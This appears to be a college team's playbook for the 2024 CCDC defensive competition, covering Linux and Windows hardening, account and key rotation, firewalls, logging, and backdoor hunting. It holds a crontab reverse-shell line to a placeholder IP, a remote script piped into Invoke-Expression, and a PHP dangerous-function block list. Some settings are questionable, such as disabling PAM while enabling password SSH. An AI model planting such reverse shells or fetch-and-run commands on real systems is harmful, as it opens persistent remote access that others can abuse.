% Trickanomicon
% Clemson CCDC 2024

# Initial Action Plan

1.  Captain will facilitate a ping sweep scan to see what's on the network and assign machines.

2.  Nmap scan the machine you are assigned and give results in the appropriate channel.

    1. Run an nmap scan on all ports on your machine: `nmap -T5 -Pn -p- <IP ADDRESS>`

    2. Run a service scan with all ports that return: `nmap -T5 -sV -p <PORT LIST> <IP ADDRESS>`

    3. For Linux, get your machine's OS by copying the output from: `cat /etc/os-release`

3.  Proceed to Linux or Windows section based on assigned machine.

# Linux

**Do not touch the** `seccdc_black` **account**

## 30 Minute Plan

1. [NMAP Scan Machine](#nmap) in background
2. [Backup files](#backups)
3. Rotate all ssh keys
    1. Populate the machines with the ssh key from lead linux captain
    2. Deploy with `ssh-copy-id -i <file> <user@host>`
    3. Ensure there is only one entry (one line) in `~/.ssh/authorized_keys`. If there are more than one, remove all lines EXCEPT the very last one. After saving, make sure you can still SSH by trying on a NEW terminal.
    4. Remove all other authorized keys files with `find / -name authorized_keys`

4. Check local accounts and reset password **ASAP** using appropriate one liners from [Duncan's Magic](#dmagic)
5. Lock unnecessary accounts with `usermod -L <login>` and if nothing goes red, delete account with `userdel <login>`. Or use appropriate one liners from [Duncan's Magic](#dmagic) to lock accounts
    1. **NOTE**: user home directories were intentionally not deleted with the `userdel` command with the idea of possible needing that data for future injects (you never know). \
	If you absolutely need to remove extraneous user home directories, seek approval from the team captain before proceeding with the command `userdel -r <login>`

6. Find listening services with `ss -tunlp` and investigate strange ones

## Monitoring

1. View all network connections `ss -tunlp`
2. View listening programs with `ss -lp`
3. View only connections with `ss -tu`
4. View active processes `ps -e`
5. Continuously see processes with `top`
    1. Sort by different categories with `<` and `>`
    2. Tree view with `V`

6. Watch **all** network traffic with the following (this is a fire hose)
    1. Record inbound traffic with `iptables -I INPUT -j LOG`
    2. Record outbound traffic with `iptables -I OUTPUT -j LOG`
    3. Watch logs with `journalctl -kf –grep="OUT=.*"`

7. Watch dbus with `dbus -w`

## Backups

1. Look for csv's and import scripts in home dir
2. Backups data directory with `tar czf var-lib.tar.gz /var/lib &`
3. Backups conf directory with `tar czf etc.tar.gz /etc &`
4. Copy tar files to local machine with `scp '<remote>:*.tar.gz' .` (run command on local machine);w

## System Utilities

1. Start and stop processes with `systemctl`
    1. Start service with `systemctl start <unit>`
    2. Stop service with `systemctl stop <unit>`
    3. Restart service with `systemctl restart <unit>`
    4. Enable service with `systemctl enable <unit>`

2. Permit and allow network connections with `iptables`
    1. Default deny with `iptables -P INPUT DROP`
    2. Allow port access (must choose tcp or udp) \
		`iptables -A INPUT -p <tcp|udp> –dport <port> -j ACCEPT`
    4. Allow all from interface `iptables -A INPUT -i <interface> -j ACCEPT`

3. Schedule tasks with cron
    1. View with `crontab -eu <user>`
    2. Obliterate user's crontab with `crontab -ru <user>`
    3. See [Duncan's Magic](#dmagic) for a one liner to remove crontabs from a list of users. Don't forget to remove the root user's crontab too!

4. View networking information with `ip`
    1. View network interfaces with `ip l`
        1. Interfaces are prefixed with an `en` to signify ethernet, `wl` to signify wireless, and `v` to signify a virtual link
        2. Virtual links should be investigated, as they are commonly used for VPNs, docker, and nonsense
        3. Virtual servers will still show their main link to the host as ethernet

    2. View IP Addresses with `ip a` and take note of additional addresses

## Configurations

1. SSH Daemon configs are in `/etc/ssh/sshd_config` and should be set as follows
```
PermitRootLogin prohibit-password
UsePAM no
PasswordAuthentication yes
PermitEmptyPasswords no
```

2. File system configs are in `/etc/fstab`
    1. Network File Shares are in the form \
        `/srv/home hostname1(rw,sync,no_subtree_check)` \
        These allow sharing file systems over the network. They must be reviewed to ensure we are not sharing information with attackers

## Hunting

1. Find a process's parent ID with `ps -f <pid>` and look at `PPID`
2. List all files with creation date, most recent first: `find /usr /bin /etc \` \
    `/var -type f -exec stat -c "%W %n" {} + | sort -r > files`

3. List all files created after set date, most recent first: \
    `find /usr /bin /etc /var -type f -newermt <YYYY-MM-DD> -exec \` \
    `stat -c "%W %n" {} + | sort -rn > files`


## Duncan's Magic {#dmagic}

1. Remove users listed in **./disable.txt**\
    `while read user;do sudo usermod -L $user;done<disable.txt`

2. Generate new passwords for every user in **./users.txt**. Output format and filename as specified by SECCDC-2024 password reset guidelines. Ensure team number is correct and SERVICE is changed to match the corresponding service the passwords are being reset for.\
    `s='<service>'; while read u; do u=‘echo $u|tr -d ' '‘; \` \
    `p=‘tr -dc 'A-Za-z0-9!@#$%'</dev/urandom|head -c 24; echo‘; \` \
    `echo $s,$u,$p; done < users.txt > Team25_${s}_PWD.csv`

3. Actually reset passwords using the generated list from the command immediately preceeding this\
    `awk -F, '{print $2":"$3}' <file.csv> | sudo chpasswd`

4. Find users not in **./known_users.txt** \
    `awk -F: '{if($3>=1000&&$3<=60000){print $1}}' /etc/passwd| \` \
    `sort - known_users.txt | uniq -u > extra_users.txt`

5. Remove crontabs from list of users in **./users.txt** \
    `while read u; do sudo crontab -u $u -r; done < users.txt`

## Hardening

You should remount /tmp and /var/tmp to be non-executable.

1. If /tmp and /var/tmp are already mounted, you can simply do: \
    `mount -o remount,nodev,nosuid,noexec /tmp`\
    `mount -o remount,nodev,nosuid,noexec /var/tmp `

2. If they haven't already been mounted, edit /etc/fstab to include: \
    `tmpfs /tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777 0 0`\
    `tmpfs /var/tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=1777 0 0 `

3. Once /etc/fstab has been updated, you can run: \
    `mount -o nodev,nosuid,noexec /tmp`\
    `mount -o nodev,nosuid,noexec /var/tmp `

## Disaster Prevension

1. Open multiple ssh sessions to different users
2. Add SSH key to multiple users, such as root
3. Determine your IP, and place the line below in root's crontab
	1. On your localhost you can listen to port 4444 to catch the shell

``` crontab
* * * * * /bin/bash -i >& /dev/tcp/<ip>/4444 0>&1
```

## Disaster Recovery

1. Service goes down
    1. Determine the service
    5. Try restarting: `sudo systemctl restart <service>`
    2. Find errors in logs with `sudo journalctl -xe <service>`
    3. If it is a configuration error, restore previous config or manually reset
    4. If the service is still down **alert the team**

2. Loosing access to a box
    1. **Alert the team**
    2. [Start nmap scan](#nmap)
    3. Try verbose ssh `ssh -v <user>@<ip>`

## Logging with auditd

Setup auditd for logging purposes

1. Make sure auditd daemon is enabled and running
    1. `sudo systemctl enable –now auditd`

2. After auditd has been started, add rules to `/etc/audit/rules.d/audit.rules`. You will need `sudo` permissions to edit this file.

    1. Visit this masterful auditd github repo(https://github.com/Neo23x0/auditd/blob/master/audit.rules) for a wide variety of auditd rules to copy / imitate.

3. Restart auditd to apply these new rules
    1. `sudo systemctl restart auditd`

Looking at auditd alerts

1. Logs are stored in `/var/log/audit/audit.log`
    1. You can use `ausearch` to query this log
    2. `aureport` can also be used to generate a list of events

2. Important takeaways when analyzing auditd logs
    1. euid = effective user id. Pay attention if EUID field is 0 as this means a file or program was run as root
    2. exe field indicates which command was run (if one was run at all)
    3. key field stores the name of the alert that was triggered
    4. pid field stores the process id

3. Utilize the various fields, timestamps, and `ausearch` and `aureport` tools to observe, report, and take action on suspicious activity

# Windows

**Do not touch the** `seccdc_black` **account.**

## Action Plan

### Windows Lead Only

1. Enumerate domain and notify captain with `get-adcomputer -filter *`.

2. Change your password **to the password provided to you**.
```powershell
# changing your password
net user <USERNAME> <NEW PASSWORD>
```

3. Create a new domain user named Grimace with **the password provided to you**.
```powershell
# creating user and adding to group
new-aduser "Grimace" -Enabled $true -AccountPassword (Read-Host -AsSecureString) 
add-adgroupmember -Identity "Domain Admins" -Members "Grimace"
```

4. Generate passwords for domain users with [scripts](#windows-scripts) and backup off the machine. **Wait to reset passwords until directed by captain.** 

5. Audit members of `Domain Admins` and `Enterprise Admins` groups with [scripts](#windows-scripts).

6. Run PingCastle to do a sweep of domain vulnerabilities. **Come back to this later.**

### Everyone
1. Create an authorized_keys file for Grimace and your user **with the SSH key given to you.**

```powershell
# creating authorized keys file and setting key
new-item $HOME\.ssh\authorized_keys -force;
echo "<PUBKEY>" | set-content $HOME\.ssh\authorized_keys

new-item C:\Users\Grimace\.ssh\authorized_keys -force;
echo "<PUBKEY>" | set-content C:\Users\Grimace\.ssh\authorized_keys
```

2. Audit local users (if any) with [scripts](#windows-scripts).

3. Key Management
    1. Find and remove unauthorized SSH keys. 
```powershell
# search for keys in the Users directory
dir C:\Users -Force -Recurse -Filter "authorized_keys"
```
    2. Remove all `Match Group` sections in `C:\ProgramData\ssh\sshd_config` and save.

    3. Restart the sshd service.
```powershell
restart-service "sshd" -force
```

4. Backup service directories and store off the machine.
```powershell
mkdir C:\temp

# all servers
cp C:\ProgramData C:\temp\ -recurse -force

# for servers running iis
cp C:\inetpub C:\temp\ -recurse -force

compress-archive C:\temp\* -destinationpath backup.zip
```

5. After network discovery completes, configure Firewall.

    1.  Export current firewall policy.  
```powershell
netsh advfirewall export "C:\rules.wfw"
```

    2.  Disable firewall.  
```powershell
netsh advfirewall set allprofiles state off
```

    3.  Flush unneeded inbound/outbound rules.  
```powershell
# use this on a domain controller
$rules = get-netfirewallrule | ? {
    $_.DisplayGroup -notmatch `
    "Replication|^DNS|Domain Services|Key Distribution"
}
```
```powershell
# use this on a domain member (note the spacing)
$rules = get-netfirewallrule | ? {
    $_.DisplayName -notmatch `
    " +DNS|Group Policy"
}
```
```powershell
$rules | remove-netfirewallrule
```

    4.  Allow RDP inbound.
```powershell
New-NetFirewallRule -DisplayName "Inbound 3389" `
-Direction Inbound -LocalPort 3389 -Protocol TCP `
-Action Allow -Program "C:\Windows\System32\svchost.exe"
```

    5. Allow SSH inbound. Get the ssh path with `where.exe sshd.exe`
```powershell
New-NetFirewallRule -DisplayName "Inbound 22" `
-Direction Inbound -LocalPort 22 -Protocol TCP `
-Action Allow -Program "C:\<PATH TO SSH>\sshd.exe"
```

    6. Allow scored services (if any) inbound.
```powershell
$port = <PORT>; New-NetFirewallRule -DisplayName "Inbound $port" `
-Direction Inbound -LocalPort $port -Protocol TCP `
-Action Allow
```

    7.  Re-enable firewall to block inbound and outbound.
```powershell
netsh advfirewall set allprofiles firewallpolicy blockinbound,blockoutbound
netsh advfirewall set allprofiles state on
```

    8. Enable firewall logging for all profiles (logs stored at %System32%\LogFiles\Firewall):
```powershell
set allprofiles logging allowedconnections enable
set allprofiles logging droppedconnections enable
```

5. Proceed to [System Hardening](#hardening-1).

6. Proceed to [Logging](#logging).

7. Proceed to [Hunting](#hunting-1).

8. Proceed to [Monitoring](#monitoring-1).
   
## Windows Scripts

1.  Generate CSV file with passwords:
```powershell
$l = ([char]'a'..[char]'z') + ([char]'A'..[char]'Z');

gc "users.txt" | foreach {
    $p = -join ($l | get-random -Count 20 | foreach {[char]$_}) + "7!";
    ac "$(hostname).csv" "$(hostname)-SERVICE,$_,$p"
}
```

2.  Reset Passwords based on generated password CSV file:
Local Machine:
```powershell
import-csv "$(hostname).csv" -Header "host","user","pass" |
foreach {net user $_.user $_.pass};
del "$(hostname).csv"
```

3.  Audit accounts on system based on list of expected users:

Unauthorized Users:
```powershell
$expected = get-content "users.txt";
$expected += $env:Username, "seccdc_black", "Grimace"
get-localuser | foreach {
	if ($_.Name -notin $expected) {
		echo $_.Name; add-content "unexpected.txt" $_.Name
	}
}
```

Domain Controller (Unuauthorized Domain Admins):
```powershell
$expected = get-content "admins.txt";
$admins = get-adgroupmember "Domain Admins" | select-object -expandproperty name;
foreach ($admin in $admins) {
	if ($admin -notin $expected) {
		echo $admin; add-content "unexpected.txt" $admin
	}
}
```

Domain Controller (Unuauthorized Enterprise Admins):
```powershell
$expected = get-content "admins.txt";
$admins = get-adgroupmember "Enterprise Admins" | select-object -expandproperty name;
foreach ($admin in $admins) {
	if ($admin -notin $expected) {
		echo $admin; add-content "unexpected.txt" $admin
	}
}
```

4.  Disable unauthorized accounts:
```powershell
get-content "unexpected.txt" | foreach {net user $_ /active:no}
```

## Hardening

1. Confirm that there are no Password Filters or Security Packages in place. **If any exist, remove them and restart the machine.** 
```powershell
# password filters (should only show scecli and rassfm)
get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages"

# security packages (there should be none)
get-itemproperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Security Packages"
```

2. Service Management:

    1.  Disable Print Spooler.    
        `Set-Service -Name "Spooler" -Status stopped -StartupType disabled -Force`

    2.  Disable WinRM.  
        `Set-Service -Name "WinRM" -Status stopped -StartupType disabled -Force`

    3.  Configure SMB:

        1.  If SMB is unneeded (i.e. not in an AD setting), disable it entirely.  
            `Set-Service -Name "LanmanServer" -Status stopped -StartupType disabled`

        2.  If SMB is needed, do the following:

            1. Disable SMBv1.  
                `Set-SmbServerConfiguration -EnableSMB1Protocol $False -Force`

            2. Disable SMB Compression:
                ``Set-SmbServerConfiguration -DisableCompression $True -Force``

            3. List out all shares on the system with `net share`.
                Remove any unrecognized shares with `Remove-SmbShare -Name <SHARENAME>`
                Administrative shares (ADMIN\$, IPC\$, C\$, NETLOGON, SYSVOL) **should not be removed.**

    4.  Harden the scored service for your machine according to the documentation [below](#Services). **If on a DC, skip to Group Policy.**

3.  Group Policy **(done via DC ONLY)**:

    * Follow the guidance given by PingCastle **first** before applying the below policies.

    * Hardening Policy
        1.  Firewall:
            1.  `Computer Configuration > Windows Settings > Security Settings > Windows Firewall with Advanced Security > Firewall State`
                -  Turn on for all profiles and block inbound/outbound traffic.
        2. Services:
            1. `Computer Configuration > Administrative Templates > Network > Network Provider > Hardened UNC Paths`
                - \\*\SYSVOL - RequireMutualAuthentication=1, RequireIntegrity=1
                - \\*\NETLOGON - RequireMutualAuthentication=1, RequireIntegrity=1
            2. `Computer Configuration > Administrative Templates > Network > DNS Client`
                - Enable - Turn OFF Multicast Name Resolution
            3. `Computer Configuration > Windows Settings > Local Policies > Security Options`
                - Microsoft network client: Digitally sign communications (always)
                - Microsoft network server: Digitally sign communications (always)
                - Domain member: Digitally encrypt or sign secure channel data (always)
            4. `Computer Configuration > Admininstrative Templates > System > Remote Procedure Call` 
                - Restrictions for Unauthenticated RPC Clients: Authenticated
        3. Registry:
            1. Prevent Plaintext Storage of Credentials:
                - `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0`
                - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v Negotiate /t REG_DWORD /d 0 /f`
            2. LSASS Hardening:
                - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 00000001 /f`
            3. Remote DLL Hijacking Protections:
                - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v CWDIllegalInDllSearch /t REG_DWORD /d 0x2 /f`
                - `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDLLSearchMode /t REG_DWORD /d 1 /f`
    * Audit Policy
        1.  Powershell Block/Module Logging: `Administrative Templates > Windows Components > Windows Powershell`
    * After policy has been configured and enforced, run `gpupdate /force` on each machine in the domin.
   
## Logging

1.  Configure Sysmon with [our config](https://raw.githubusercontent.com/D42H5/cyber_comp_resources/main/sysmonconfig-export-modified-2-2-24.xml).

    1.  To install Sysmon, run `sysmon -i <PATH TO CONFIG FILE>`.

    2.  Logs are sent to Applications and Services Logs > Microsoft > Windows > Sysmon.

    3.  If you want to update your config file, run `sysmon -c <PATH TO NEW CONFIG>`.

## Hunting

1. Run a system scan with Malwarebytes.

2. Check for any connected user sessions and terminate unknown ones.
    1.  View all connected RDP sessions with `qwinsta` and kill sessions with `rwinsta <SESSION ID>`.

    2.  View SSH sessions `get-process -includeusername | ? {$_.ProcessName -like "sshd"}`. Kill a process with `taskkill /f /pid <PID>`. **The SYSTEM sshd process should not be killed.** 
    
3. Use BLUESPAWN (and optionally DEEPGLASS) to audit the system for backdoors.
    1. `BLUESPAWN.exe -h` will do a one-pass scan for MITRE ATT&CK indicators.

    2. `BLUESPAWN.exe -m` will monitor for indicators and can actively remediate them.
    
    3. `DEEPGLASS.exe` will scan the file system and registry for suspicious files.

4. Startup items and registry run keys should be checked with Autoruns.

5. Time permitting, check the common backdoors listed in detail below:

* Run Keys & Startup Folder
    - Run every time a user logs into the machine.
```
HKLM:\Software\Microsoft\Windows\CurrentVersion\Run\
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce\
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices\
HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\
HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
```
```
HKCU:\Software\Microsoft\Windows\CurrentVersion\Run\
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce\
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices\
HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce\
HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
```
```
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\ 
HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\
HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\
HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\
```

* AppCert DLLs
    - Loaded into any process that calls CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec
```
HKLM:\System\CurrentControlSet\Control\Session Manager
```

* AppInit DLLs
    - Loaded by every process that uses user32.dll (almost all). Disabled in Windows 8+ if secure boot is enabled.
```
HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows
HKLM:\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows
```

* Component Object Model (COM) Hijacking
    - User objects in this key will override machine objects in HKLM.
```
HKCU:\Software\Classes\CLSID\
```

* Netsh Helper DLLs
    - Executes helper DLLs when executed which are registered at this key.
```
HKLM:\SOFTWARE\Microsoft\Netsh
```

* Port Monitors
    - Should only contain Appmon, Local Port, Microsoft Shared Fax Monitor, Standard TCP/IP Port, USB Monitor, WSD Port. Can be used to load arbitrary DLLs at startup, will run as SYSTEM.
```
HKLM:\SYSTEM\CurrentControlSet\Control\Print\Monitors
```

* Screensavers
    - More than just bubbles and ribbons. Check SCRNSAVE.exe, make sure ScreenSaveIsSecure == 1.
```
HKCU:\Control Panel\Desktop\
```

* Security Support Provider (SSP) DLLs
    - Loaded into LSA at startup or when AddSecurityPackage is called. Let's red team see plaintext creds.
```
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages
```
On Windows 8.1 & Server 2012R2, change AuditLevel to 8 to to require SSP DLLs to be signed.
```
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe
```

* Password Filters
    - Used to harvest creds anytime a password is changed. Should only contain sceli & rassfm as notification Packages.
```
HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Notification 
```

* Winlogon Helper DLL
    - Handles actions at logon/logoff.
```
HKLM:\Software[Wow6432Node]Microsoft\Windows NT\CurrentVersion\Winlogon\
HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
...\\Winlogon\Notify
...\\Winlogon\Userinit
...\\Winlogon\Shell
```

* Services
    - Service configuration info is stored in keys in this folder. 
```
HKLM:\SYSTEM\CurrentControlSet\Services
```
    - **Services can have an attribute set that makes them hidden. Check for hidden services with:**
```
Compare-Object -ReferenceObject (Get-Service | Select-Object -ExpandProperty Name | % { $_ -replace "_[0-9a-f]{2,8}$" } ) -DifferenceObject (gci -path hklm:\system\currentcontrolset\services | % { $_.Name -Replace "HKEY_LOCAL_MACHINE\\","HKLM:\" } | ? { Get-ItemProperty -Path "$_" -name objectname -erroraction 'ignore' } | % { $_.substring(40) }) -PassThru | ?{$_.sideIndicator -eq "=>"}
```

* Scheduled Tasks
    - Scheduled task configuration info is stored in keys in these folders.
```
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\
HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
```
    - **Tasks can be hidden by deleting the Security Descriptor. Check for hidden tasks with:**
```
compare-object -referenceobject (get-scheduledtask | select-object -expandproperty taskname | sort-object) -differenceobject (gci -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\" -recurse | get-itemproperty | ? {$_.Id -ne $null} | select-object -expandproperty PSPath | split-path -leaf | sort-object) -includeequal
```

### Common Backdoors
* Sticky keys
* Web shells
* Malicious accounts
* Golden ticket 
* Keylogger

## Monitoring

1.  View incoming network connections with `netstat -of` or the firewall logs. For a GUI view, use TCPView.

2.  View running processes in the details pane of Task Manager, via Process Explorer, or with `tasklist`.
    1.  Find information about a running process with `wmic process where '(processid=<PID>)' get 'processid,parentprocessid,executablepath'`.

3.  View all shares with `net share` and connected Named Pipes / Shares with `net use`.

4.  Monitor the Event Logs for unexpected activity.

# Services

## MySQL

1.  Change passwords for any non-scored users,
``` sql
SELECT User, Host FROM mysql.user;
ALTER USER '<USERNAME>'@'<HOST>' IDENTIFIED BY '<NEW PASSWORD>';
```

2.  Drop unauthorized users.
``` sql
SELECT User, Host FROM mysql.user;
DROP USER '<USERNAME>'@'<HOST>';
```

3.  Prepare a database backup and store somewhere safe **off the system**.

    1.  Backup: `mysqldump -u <USERNAME> -p –-all-databases --host <HOST> > <BACKUP PATH>`

    2.  Restore: `mysql -u <USERNAME> -p --host <HOST> < <BACKUP PATH>`

    If using Powershell to restore, do this instead: `Get-Content <BACKUP PATH> | mysql -u <USERNAME> -p --host <HOST>`

## FTP

**ANONYMOUS ACCESS CANNOT BE DISABLED.**

1.  On Windows, you will interact with the IIS console to manage FTP.

2.  On Linux, you will interact with /etc/vsftpd.conf (probably).

3.  Manage anonymous permissions to only allow reads (and writes if needed).

4.  Restrict access to non-shared directories from anonymous users.

5.  Prevent executables from running in the shared directory.

## SSH

1.  You can tunnel a port over ssh with the following syntax:  
    `ssh -L <LPORT>:<RHOST>:<RPORT> <USER>@<RHOST>`

## Web Servers

1.  With IIS, some hardening can be automated with this
    [script](https://github.com/ufsitblue/blue/blob/main/dsu_blue/windows/IIS.ps1).

2.  (If applicable) Change passwords for user accounts on website.

3.  Ensure that directory listing is disabled.

4.  Check web server directory for php webshells.

    1.  Webshells are likely to have malicious phrases like exec in the php file.

    2.  You can minimize the possibility of this attack by disabling the phrases outright.

    3.  Run php --ini to list all of the config files currently loaded into php.

    4.  Add the following lines to the end of each config file:

``` php
# disables commonly exploited functions
disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source

# disable file uploads only if they aren't needed
file_uploads=off
allow_url_fopen=off
allow_url_include=off
```

# Appendix

## Helpful Windows Utilities

**NOTE** If using powershell to curl, you will need to run the following to enable TLS:  
`[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12`

1.  For package management (Scoop):
```powershell
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser;
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
```

2.  For system logging and monitoring:
    [Sysinternals Suite](https://download.sysinternals.com/files/SysinternalsSuite.zip)  
    [Sysmon Config](https://raw.githubusercontent.com/D42H5/cyber_comp_resources/main/sysmonconfig-export-modified-2-2-24.xml)  
    [EventLogViewer](https://www.nirsoft.net/utils/fulleventlogview-x64.zip)  

3.  For antivirus scanning:  
    [Microsoft Safety Scanner](https://go.microsoft.com/fwlink/?LinkId=212732) (portable)  
    [Malwarebytes](https://downloads.malwarebytes.com/file/mb-windows) (requires install)  

4.  For environment auditing:
    [PingCastle](https://github.com/vletoux/pingcastle/releases/download/3.2.0.1/PingCastle_3.2.0.1.zip)

## Active Directory Reference

### Hardening

1.  The krbtgt password should be reset periodically with this [password reset script](https://github.com/microsoft/New-KrbtgtKeys.ps1).

2.  You can force a reset of domain group policy with the below commands:
```powershell
dcgpofix /target:both
gpupdate /force
```

## Powershell Reference

### Useful Cmdlets

* get-localuser : Lists local users on the system
* get-aduser -Filter "*" : lists domain users
* get-adcomputer -Filter "*" -properties IPv4Address : lists domain computers
* get-process : Lists currently running processes
* get-nettcpconnection : Lists currently listening/established TCP channels
* get-netudpendpoint : Lists currenrly listening UDP endpoints
* get-childitem -force : Lists all items (including hidden) in the current directory

### Sample Commands

List all processes owned by SYSTEM that are listening for network connections:
```powershell
Get-process -IncludeUsername |
foreach {
    if ($_.UserName -like "*SYSTEM*") {
        $con = Get-nettcpconnection -State Listen -ErrorAction SilentlyContinue -OwningProcess $_.Id;
        if ($con -ne $null) {"{0} {1} {2}" -f $con.LocalPort,$_.Id,$_.ProcessName}
    }
}
```
